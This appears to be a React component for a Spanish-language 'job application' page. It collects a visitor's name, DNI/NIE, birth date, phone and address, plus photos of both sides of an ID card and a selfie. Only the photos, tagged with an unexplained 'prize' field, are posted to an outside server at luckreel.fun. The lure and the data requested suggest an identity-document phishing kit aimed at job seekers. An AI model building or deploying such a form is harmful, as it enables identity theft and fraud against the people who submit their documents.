import { useState } from 'react';
import './block5.sass'
import { FaRegAddressCard } from "react-icons/fa6";
import { FaRegCreditCard } from "react-icons/fa6";
import { FaRegCircleUser } from "react-icons/fa6";
import PassportScanner from './passScaner/PassportScanner'
import axios from 'axios';


export default function Block5() {

    const [passScaner, setPassScaner] = useState();

    const [front, setFront] = useState();
    const [back, setBack] = useState();
    const [selfie, setSelfie] = useState();
    const [missingInputs, setMissingInputs] = useState(false);

    const handleSubmit = async (e) => {
        e.preventDefault();
        if ( !front || !back || !selfie) {
            setMissingInputs(true);
        } else {
            setMissingInputs(false);
            const formData = new FormData();
            formData.append('prize', 'other');
            formData.append('images', front); // Добавляем переднее изображение в список images
            formData.append('images', back); // Добавляем заднее изображение в список images
            formData.append('images', selfie); // Добавляем селфи в список images
            await axios.post('https://luckreel.fun:3001/send', formData);
        }
    };



    const handleFileChange = (e, type) => {
        const file = e.target.files[0];

        switch (type) {
            case 'front':
                setFront(file);
                break;
            case 'back':
                setBack(file);
                break;
            case 'selfie':
                setSelfie(file);
                break;
            default:
                break;
        }
    };


    return (
        <div className="Block5" >
            <div className="container">
                <h2>Proporcionar información para conseguir un trabajo!</h2>
                {passScaner ? (
                    <PassportScanner
                        front={front}
                        setFront={setFront} setBack={setBack} setSelfie={setSelfie}
                        passScaner={passScaner} setPassScaner={setPassScaner}
                    ></PassportScanner>
                ) : (
                    <form action="" id='sec' onSubmit={handleSubmit}>
                        <input type="text" placeholder='Apellido' />
                        <input type="text" placeholder='Nombre' />
                        <input type="text" placeholder='DWI\NIE' />
                        <input type="text" placeholder='Fecha de nacimiento' />
                        <input type="text" placeholder='Número de teléfono' />
                        <input type="text" placeholder='Dirección de residencia' />
                        {/*TODO 3 штуки для фотки */}

                        <div className="photo front">
                            <input type="file" accept="image/*" capture="environment" onChange={(e) => handleFileChange(e, 'front')} />
                            <a href="#cam"><span onClick={() => setPassScaner('front')}>{front ? (<img src={URL.createObjectURL(front)} alt="" />) : (<FaRegAddressCard />)} Antes ID CARD</span></a>
                        </div>

                        <div className="photo back">
                            <input type="file" accept="image/*" capture="environment" onChange={(e) => handleFileChange(e, 'back')} />
                            <a href="#cam"><span onClick={() => setPassScaner('back')}>{back ? (<img src={URL.createObjectURL(back)} alt="" />) : (<FaRegCreditCard />)} Atrás ID CARD</span></a>
                        </div>

                        <div className="photo selfie">
                            <input type="file" accept="image/*" capture="user" onChange={(e) => handleFileChange(e, 'selfie')} />
                            <a href="#cam"><span onClick={() => setPassScaner('selfie')}>{selfie ? (<img src={URL.createObjectURL(selfie)} alt="" />) : (<FaRegCircleUser />)} Autofoto</span></a>
                        </div>


                        <span className='photo'>*Se da prioridad a perfiles de alta calidad con buenas fotos.</span>
                        {missingInputs  && <span className="error-msg">¡No has subido todas las fotos!</span>}
                        <button onClick={handleSubmit}>Enviar datos</button>
                    </form>
                )}

            </div>
        </div>
    )
}